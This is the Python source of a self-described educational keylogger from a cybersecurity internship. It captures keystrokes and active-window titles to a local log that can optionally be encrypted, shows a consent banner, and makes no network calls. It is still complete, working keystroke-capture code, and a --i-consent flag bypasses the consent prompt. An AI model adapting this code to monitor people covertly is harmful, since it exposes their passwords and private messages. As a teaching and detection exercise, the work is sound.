"""
Educational Keylogger
======================
A demonstration keylogger built for a cyber-security internship assignment.

DESIGN PRINCIPLES (this is deliberately NOT stealthy malware):
  * VISIBLE  - prints a banner and requires explicit consent before running.
  * LOCAL    - writes only to a local log file. It never sends data anywhere.
  * OPTIONAL ENCRYPTION - the log can be encrypted at rest with Fernet so the
    captured data is not left in plaintext on disk.
  * TRANSPARENT - the code is heavily commented so a reader can learn how
    keystroke capture actually works.

LEGAL / ETHICAL NOTICE
  Only run this on a computer you own, or on a machine where every user has
  given informed consent. Capturing another person's keystrokes without
  authorization is illegal in most jurisdictions (wiretapping / computer-misuse
  laws). This tool exists to teach how keyloggers work so they can be detected
  and defended against.

Usage:
    python keylogger.py                 # plaintext log, asks for consent
    python keylogger.py --encrypt       # encrypt the log at rest
    python keylogger.py --no-window     # do not record active-window titles
    python keylogger.py --i-consent     # skip the interactive consent prompt
                                        # (for automated demos you control)

Stop the keylogger with the ESC key or Ctrl+C.
"""

from __future__ import annotations

import argparse
import ctypes
import datetime as _dt
import os
import platform
import sys
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    sys.exit(
        "The 'pynput' package is required.\n"
        "Install dependencies with:  pip install -r requirements.txt"
    )

# Encryption is optional; only import if available so the core still runs.
try:
    from cryptography.fernet import Fernet
    _CRYPTO_AVAILABLE = True
except ImportError:
    _CRYPTO_AVAILABLE = False


# --------------------------------------------------------------------------- #
# Configuration
# --------------------------------------------------------------------------- #
LOG_DIR = Path(__file__).resolve().parent / "logs"
LOG_FILE = LOG_DIR / "keystrokes.log"
KEY_FILE = LOG_DIR / "secret.key"
MAX_LOG_BYTES = 1_000_000          # rotate the log once it passes ~1 MB
MAX_ROTATIONS = 5                  # keep keystrokes.log.1 .. .5


# --------------------------------------------------------------------------- #
# Consent banner  (the ethical safeguard)
# --------------------------------------------------------------------------- #
BANNER = r"""
============================================================
   EDUCATIONAL KEYLOGGER  -  runs VISIBLY, logs LOCALLY
============================================================
 This program will record the keys pressed on THIS computer
 to a local file until you press ESC or Ctrl+C.

 * It does NOT hide itself.
 * It does NOT transmit anything over the network.
 * Only use it on a machine you own or are authorized to test.

 Capturing someone else's keystrokes without consent is
 illegal. You are responsible for how you use this tool.
============================================================
"""


def require_consent(skip: bool) -> None:
    """Show the banner and require the operator to actively opt in."""
    print(BANNER)
    if skip:
        print("[consent] --i-consent supplied; continuing.\n")
        return
    answer = input('Type "I AGREE" to start logging on this machine: ').strip()
    if answer != "I AGREE":
        sys.exit("Consent not given. Exiting.")
    print()


# --------------------------------------------------------------------------- #
# Active-window helper  (extra feature: context for each keystroke)
# --------------------------------------------------------------------------- #
def get_active_window_title() -> str:
    """Best-effort title of the foreground window, cross-platform."""
    system = platform.system()
    try:
        if system == "Windows":
            user32 = ctypes.windll.user32
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value or "Unknown"
        if system == "Darwin":  # macOS best effort, no extra deps
            from subprocess import run
            script = (
                'tell application "System Events" to get name of '
                "first application process whose frontmost is true"
            )
            out = run(["osascript", "-e", script], capture_output=True, text=True)
            return out.stdout.strip() or "Unknown"
        if system == "Linux":   # requires xdotool if present
            from subprocess import run
            out = run(["xdotool", "getactivewindow", "getwindowname"],
                      capture_output=True, text=True)
            return out.stdout.strip() or "Unknown"
    except Exception:
        pass
    return "Unknown"


# --------------------------------------------------------------------------- #
# Log writer  (handles rotation + optional encryption)
# --------------------------------------------------------------------------- #
class LogWriter:
    """Appends lines to the log, rotating by size and optionally encrypting."""

    def __init__(self, encrypt: bool) -> None:
        LOG_DIR.mkdir(parents=True, exist_ok=True)
        self.encrypt = encrypt
        self.fernet = self._load_cipher() if encrypt else None

    def _load_cipher(self) -> "Fernet":
        if not _CRYPTO_AVAILABLE:
            sys.exit("--encrypt needs the 'cryptography' package. "
                     "Run: pip install -r requirements.txt")
        if KEY_FILE.exists():
            key = KEY_FILE.read_bytes()
        else:
            key = Fernet.generate_key()
            KEY_FILE.write_bytes(key)
            # Tighten permissions where the OS supports it.
            try:
                os.chmod(KEY_FILE, 0o600)
            except OSError:
                pass
            print(f"[crypto] generated new key: {KEY_FILE}")
        return Fernet(key)

    def _rotate_if_needed(self) -> None:
        if not LOG_FILE.exists() or LOG_FILE.stat().st_size < MAX_LOG_BYTES:
            return
        # keystrokes.log.4 -> .5, ... , .log -> .log.1
        for i in range(MAX_ROTATIONS, 0, -1):
            src = LOG_FILE.with_suffix(LOG_FILE.suffix + f".{i - 1}") if i > 1 \
                else LOG_FILE
            dst = LOG_FILE.with_suffix(LOG_FILE.suffix + f".{i}")
            if src.exists():
                if dst.exists():
                    dst.unlink()
                src.rename(dst)

    def write(self, text: str) -> None:
        self._rotate_if_needed()
        line = text + "\n"
        if self.fernet:
            # Each line becomes an independent encrypted token on its own line.
            data = self.fernet.encrypt(line.encode("utf-8")) + b"\n"
            with open(LOG_FILE, "ab") as fh:
                fh.write(data)
        else:
            with open(LOG_FILE, "a", encoding="utf-8") as fh:
                fh.write(line)


# --------------------------------------------------------------------------- #
# The keylogger itself
# --------------------------------------------------------------------------- #
class Keylogger:
    def __init__(self, writer: LogWriter, track_window: bool) -> None:
        self.writer = writer
        self.track_window = track_window
        self.last_window: str | None = None
        self.count = 0

    def _timestamp(self) -> str:
        return _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def _maybe_log_window(self) -> None:
        """Write a context line whenever the foreground window changes."""
        if not self.track_window:
            return
        title = get_active_window_title()
        if title != self.last_window:
            self.last_window = title
            self.writer.write(f"\n[{self._timestamp()}] --- WINDOW: {title} ---")

    def on_press(self, key) -> None:
        self._maybe_log_window()
        try:
            # Printable character keys expose a `.char` attribute.
            char = key.char
            if char is not None:
                self.writer.write(char)
        except AttributeError:
            # Special keys (space, enter, shift, backspace, ...).
            special = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
            }
            self.writer.write(special.get(key, f"[{str(key).replace('Key.', '')}]"))
        self.count += 1
        # Lightweight live feedback so it is obvious the tool is running.
        print(f"\r[running] keystrokes captured: {self.count}", end="", flush=True)

    def on_release(self, key) -> bool | None:
        if key == keyboard.Key.esc:
            print("\n[stop] ESC pressed. Shutting down.")
            return False  # returning False stops the listener
        return None

    def run(self) -> None:
        self.writer.write(f"\n===== SESSION START {self._timestamp()} =====")
        print("[running] Logging keystrokes. Press ESC or Ctrl+C to stop.\n")
        try:
            with keyboard.Listener(
                on_press=self.on_press, on_release=self.on_release
            ) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\n[stop] Ctrl+C received. Shutting down.")
        finally:
            self.writer.write(f"\n===== SESSION END {self._timestamp()} =====")
            print(f"[done] {self.count} keystrokes written to: {LOG_FILE}")
            if self.writer.encrypt:
                print("[done] Log is encrypted. Decrypt it with: "
                      "python decrypt_log.py")


# --------------------------------------------------------------------------- #
# Entry point
# --------------------------------------------------------------------------- #
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Educational keylogger (local only).")
    p.add_argument("--encrypt", action="store_true",
                   help="encrypt the log file at rest with Fernet")
    p.add_argument("--no-window", action="store_true",
                   help="do not record active-window titles")
    p.add_argument("--i-consent", action="store_true",
                   help="skip the interactive consent prompt (you accept the terms)")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    require_consent(skip=args.i_consent)
    writer = LogWriter(encrypt=args.encrypt)
    logger = Keylogger(writer, track_window=not args.no_window)
    logger.run()


if __name__ == "__main__":
    main()
